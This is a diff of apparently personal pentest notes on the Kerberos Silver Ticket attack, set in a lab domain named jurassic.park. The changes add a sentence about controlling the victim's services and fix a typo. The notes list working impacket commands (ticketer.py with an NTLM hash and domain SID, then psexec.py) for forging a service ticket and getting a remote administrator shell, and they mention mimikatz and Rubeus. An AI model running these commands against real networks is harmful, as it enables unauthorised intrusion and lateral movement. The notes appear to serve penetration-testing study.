@@ -4,12 +4,13 @@ Silver Ticket
     In a Silver Ticket attack we have cracked the NTLM hash of a computer account so we can craft a ticket
     to get into that machine with administrator priviledges through the SMB service, it is preferable to forge
     tickets using the AES Kerberos Keys, computer accounts reset their passwords every 30 days.
+    What we can basically do is take control over the services in the victims computer and perform different attacks.
     -------------------------------
     Initiating the attack in Linux:
     - python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park stegosaurus
     - export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
     - python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
-    while chjanging of course the properties that are just for reference
+    while changing of course the properties that are just for reference
     -------------------------------
     With windows we can use mimikatz to craft the ticket, inject it with rebeus, and recieve remote shell with psexec
     Initiating the attack in Windows:
